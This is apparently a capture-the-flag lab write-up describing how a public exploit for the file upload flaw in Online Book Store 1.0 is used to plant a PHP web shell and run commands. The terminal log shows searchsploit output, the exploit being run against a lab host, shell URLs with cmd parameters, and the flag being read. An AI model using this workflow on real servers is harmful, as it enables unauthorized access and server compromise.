Goal of the Project:
The goal of my project was to demonstrate a remote code execution (RCE) vulnerability in the Online Book Store 1.0 web application. I wanted to explore how an arbitrary file upload vulnerability could be exploited to gain remote access to the server and execute arbitrary commands.

How I Came to the Solution:
When I started working with the Online Book Store 1.0 web application, I discovered several potential vulnerabilities. One of them was related to the arbitrary file upload feature through the /admin_add.php endpoint. After analyzing it in detail, I realized that if I uploaded a PHP file disguised as an image, I could execute arbitrary commands on the server.

What I Did:
To demonstrate the vulnerability, I wrote a Python script that automatically uploads a malicious PHP file to the server. The PHP file executes the shell_exec command, which allows me to access the server’s shell through a browser. After successfully uploading the file, I used the cmd GET parameter to execute commands on the server, such as listing files or reading the flag’s contents, confirming that the code was successfully executed.

Steps I Took:
File Upload: I wrote a script that generates a random file name and creates a PHP payload with a web shell.

Verification: After uploading the file, I checked if the file was successfully uploaded and the shell was working by sending a GET request with the echo command.

Accessing the Server: When the script confirmed that the upload was successful, I executed arbitrary commands, such as ls to list the file system, or read the flag.txt file to confirm I had full access.

Here’s what my code looks like:
root@ip-10-10-118-2:~# searchsploit online book store
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GotoCode Online Bookstore - Multiple Vulnerabilities                                                                                  | asp/webapps/17921.txt
Online Book Store 1.0 - 'bookisbn' SQL Injection                                                                                      | php/webapps/47922.txt
Online Book Store 1.0 - 'id' SQL Injection                                                                                            | php/webapps/48775.txt
Online Book Store 1.0 - Arbitrary File Upload                                                                                         | php/webapps/47928.txt
Online Book Store 1.0 - Unauthenticated Remote Code Execution                                                                         | php/webapps/47887.py
Online Event Booking and Reservation System 1.0 - 'reason' Stored Cross-Site Scripting (XSS)                                          | php/webapps/50450.txt
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@ip-10-10-118-2:~# searchsploit -m 47887.py
  Exploit: Online Book Store 1.0 - Unauthenticated Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47887
     Path: /opt/exploitdb/exploits/php/webapps/47887.py
    Codes: N/A
 Verified: True
File Type: ASCII text
Copied to: /root/47887.py


root@ip-10-10-118-2:~# ls
'=2.5,!=2.5.0,!=2.5.2,!=2.6'   burp.json    Desktop     Instructions   Postman   Scripts   thinclient_drives
 47887.py                      CTFBuilder   Downloads   Pictures       Rooms     snap      Tools
root@ip-10-10-118-2:~# nano 47887.py
root@ip-10-10-118-2:~# python 47887.py http://10.10.161.182
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.161.182/bootstrap/img/tnHrqKx1Cm.php
> Example command usage: http://10.10.161.182/bootstrap/img/tnHrqKx1Cm.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
Traceback (most recent call last):
  File "47887.py", line 35, in <module>
    launch_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
  File "<string>", line 6, in <module>
NameError: name 'y' is not defined
root@ip-10-10-118-2:~# python3 47887.py http://10.10.161.182
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.161.182/bootstrap/img/zbFpzyd1e5.php
> Example command usage: http://10.10.161.182/bootstrap/img/zbFpzyd1e5.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $ ls
OyWjgNLIbq.php
android_studio.jpg
beauty_js.jpg
c_14_quick.jpg
c_sharp_6.jpg
doing_good.jpg
flag.txt
img1.jpg
img2.jpg
img3.jpg
kotlin_250x250.png
logic_program.jpg
mobile_app.jpg
pro_asp4.jpg
pro_js.jpg
tnHrqKx1Cm.php
unnamed.png
web_app_dev.jpg
zbFpzyd1e5.php

RCE $ cat flag.txt
THM{BOOK_KEEPING}

RCE $ 
Conclusion:
This project demonstrates a critical vulnerability in the Online Book Store 1.0 web application that could be exploited for unauthorized access to the server and remote code execution. Exploiting such vulnerabilities can lead to severe security breaches, including data theft and complete server compromise.
